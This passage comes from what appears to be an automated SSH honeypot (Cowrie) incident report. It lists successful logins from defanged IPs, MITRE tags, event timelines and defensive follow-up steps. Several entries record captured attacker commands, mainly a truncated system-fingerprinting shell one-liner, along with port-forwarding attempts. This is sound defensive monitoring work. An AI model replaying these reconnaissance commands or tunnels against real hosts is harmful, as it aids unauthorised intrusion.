| `2026-07-24 03:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.130[.]18` to AbuseIPDB if not already reported
- [ ] Block `77.105.130[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027063218dba

| Field | Detail |
|---|---|
| **Source IP** | `77.105.130[.]18` |
| **First Seen** | 2026-07-24 03:19 |
| **Last Seen** | 2026-07-24 03:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:19:59` | `cowrie.session.connect` |
| `2026-07-24 03:19:59` | `cowrie.client.version` |
| `2026-07-24 03:19:59` | `cowrie.client.kex` |
| `2026-07-24 03:20:00` | `cowrie.login.success` |
| `2026-07-24 03:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.130[.]18` to AbuseIPDB if not already reported
- [ ] Block `77.105.130[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286e980986aa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:20 |
| **Last Seen** | 2026-07-24 03:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:20:14` | `cowrie.session.connect` |
| `2026-07-24 03:20:15` | `cowrie.client.version` |
| `2026-07-24 03:20:15` | `cowrie.client.kex` |
| `2026-07-24 03:20:17` | `cowrie.login.success` |
| `2026-07-24 03:20:18` | `cowrie.session.params` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.success` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:18` | `cowrie.command.input` |
| `2026-07-24 03:20:19` | `cowrie.log.closed` |
| `2026-07-24 03:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1f3ba8f2a2b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:22 |
| **Last Seen** | 2026-07-24 03:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:22:07` | `cowrie.session.connect` |
| `2026-07-24 03:22:07` | `cowrie.client.version` |
| `2026-07-24 03:22:07` | `cowrie.client.kex` |
| `2026-07-24 03:22:09` | `cowrie.login.success` |
| `2026-07-24 03:22:10` | `cowrie.session.params` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.success` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.command.input` |
| `2026-07-24 03:22:10` | `cowrie.log.closed` |
| `2026-07-24 03:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b42bdecba0c4

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-24 03:22 |
| **Last Seen** | 2026-07-24 03:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:22:11` | `cowrie.session.connect` |
| `2026-07-24 03:22:11` | `cowrie.client.version` |
| `2026-07-24 03:22:11` | `cowrie.client.kex` |
| `2026-07-24 03:22:13` | `cowrie.login.success` |
| `2026-07-24 03:22:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51062aa6056e

| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-07-24 03:22 |
| **Last Seen** | 2026-07-24 03:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:22:18` | `cowrie.session.connect` |
| `2026-07-24 03:22:19` | `cowrie.client.version` |
| `2026-07-24 03:22:19` | `cowrie.client.kex` |
| `2026-07-24 03:22:21` | `cowrie.login.success` |
| `2026-07-24 03:22:21` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c579dd3fca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:24 |
| **Last Seen** | 2026-07-24 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:24:05` | `cowrie.session.connect` |
| `2026-07-24 03:24:05` | `cowrie.client.version` |
| `2026-07-24 03:24:05` | `cowrie.client.kex` |
| `2026-07-24 03:24:06` | `cowrie.login.success` |
| `2026-07-24 03:24:08` | `cowrie.session.params` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.success` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.command.input` |
| `2026-07-24 03:24:08` | `cowrie.log.closed` |
| `2026-07-24 03:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2906d59b39e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:26 |
| **Last Seen** | 2026-07-24 03:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:26:13` | `cowrie.session.connect` |
| `2026-07-24 03:26:13` | `cowrie.client.version` |
| `2026-07-24 03:26:13` | `cowrie.client.kex` |
| `2026-07-24 03:26:15` | `cowrie.login.success` |
| `2026-07-24 03:26:16` | `cowrie.session.params` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.success` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.command.input` |
| `2026-07-24 03:26:16` | `cowrie.log.closed` |
| `2026-07-24 03:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d07cdfb3d1

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-24 03:27 |
| **Last Seen** | 2026-07-24 03:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:27:53` | `cowrie.session.connect` |
| `2026-07-24 03:27:53` | `cowrie.client.version` |
| `2026-07-24 03:27:53` | `cowrie.client.kex` |
| `2026-07-24 03:27:53` | `cowrie.login.success` |
| `2026-07-24 03:27:54` | `cowrie.session.params` |
| `2026-07-24 03:27:54` | `cowrie.command.input` |
| `2026-07-24 03:27:55` | `cowrie.log.closed` |
| `2026-07-24 03:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be9f3529d5d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:28 |
| **Last Seen** | 2026-07-24 03:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:28:21` | `cowrie.session.connect` |
| `2026-07-24 03:28:22` | `cowrie.client.version` |
| `2026-07-24 03:28:22` | `cowrie.client.kex` |
| `2026-07-24 03:28:23` | `cowrie.login.success` |
| `2026-07-24 03:28:24` | `cowrie.session.params` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.success` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:24` | `cowrie.command.input` |
| `2026-07-24 03:28:25` | `cowrie.log.closed` |
| `2026-07-24 03:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798428c2e8d5

| Field | Detail |
|---|---|
| **Source IP** | `220.189.253[.]198` |
| **First Seen** | 2026-07-24 03:29 |
| **Last Seen** | 2026-07-24 03:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:29:04` | `cowrie.session.connect` |
| `2026-07-24 03:29:05` | `cowrie.client.version` |
| `2026-07-24 03:29:05` | `cowrie.client.kex` |
| `2026-07-24 03:29:08` | `cowrie.login.success` |
| `2026-07-24 03:29:08` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.253[.]198` to AbuseIPDB if not already reported
- [ ] Block `220.189.253[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be93d5c66618

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:30 |
| **Last Seen** | 2026-07-24 03:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:30:21` | `cowrie.session.connect` |
| `2026-07-24 03:30:21` | `cowrie.client.version` |
| `2026-07-24 03:30:21` | `cowrie.client.kex` |
| `2026-07-24 03:30:23` | `cowrie.login.success` |
| `2026-07-24 03:30:24` | `cowrie.session.params` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.success` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:24` | `cowrie.command.input` |
| `2026-07-24 03:30:25` | `cowrie.log.closed` |
| `2026-07-24 03:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ba2aa3517f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:32 |
| **Last Seen** | 2026-07-24 03:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:32:19` | `cowrie.session.connect` |
| `2026-07-24 03:32:19` | `cowrie.client.version` |
| `2026-07-24 03:32:19` | `cowrie.client.kex` |
| `2026-07-24 03:32:20` | `cowrie.login.success` |
| `2026-07-24 03:32:22` | `cowrie.session.params` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.success` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:22` | `cowrie.command.input` |
| `2026-07-24 03:32:23` | `cowrie.log.closed` |
| `2026-07-24 03:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a431fec767c

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-24 03:32 |
| **Last Seen** | 2026-07-24 03:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:32:30` | `cowrie.session.connect` |
| `2026-07-24 03:32:30` | `cowrie.client.version` |
| `2026-07-24 03:32:30` | `cowrie.client.kex` |
| `2026-07-24 03:32:31` | `cowrie.login.success` |
| `2026-07-24 03:32:32` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e83057e84cf

| Field | Detail |
|---|---|
| **Source IP** | `182.92.236[.]135` |
| **First Seen** | 2026-07-24 03:33 |
| **Last Seen** | 2026-07-24 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:33:18` | `cowrie.session.connect` |
| `2026-07-24 03:33:19` | `cowrie.client.version` |
| `2026-07-24 03:33:19` | `cowrie.client.kex` |
| `2026-07-24 03:33:22` | `cowrie.login.success` |
| `2026-07-24 03:33:24` | `cowrie.session.params` |
| `2026-07-24 03:33:24` | `cowrie.command.input` |
| `2026-07-24 03:33:25` | `cowrie.log.closed` |
| `2026-07-24 03:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.92.236[.]135` to AbuseIPDB if not already reported
- [ ] Block `182.92.236[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6db81fa589

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:34 |
| **Last Seen** | 2026-07-24 03:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:34:15` | `cowrie.session.connect` |
| `2026-07-24 03:34:15` | `cowrie.client.version` |
| `2026-07-24 03:34:15` | `cowrie.client.kex` |
| `2026-07-24 03:34:18` | `cowrie.login.success` |
| `2026-07-24 03:34:19` | `cowrie.session.params` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.success` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.command.input` |
| `2026-07-24 03:34:19` | `cowrie.log.closed` |
| `2026-07-24 03:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac05bb87ce69

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:36 |
| **Last Seen** | 2026-07-24 03:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:36:07` | `cowrie.session.connect` |
| `2026-07-24 03:36:08` | `cowrie.client.version` |
| `2026-07-24 03:36:08` | `cowrie.client.kex` |
| `2026-07-24 03:36:10` | `cowrie.login.success` |
| `2026-07-24 03:36:11` | `cowrie.session.params` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.success` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
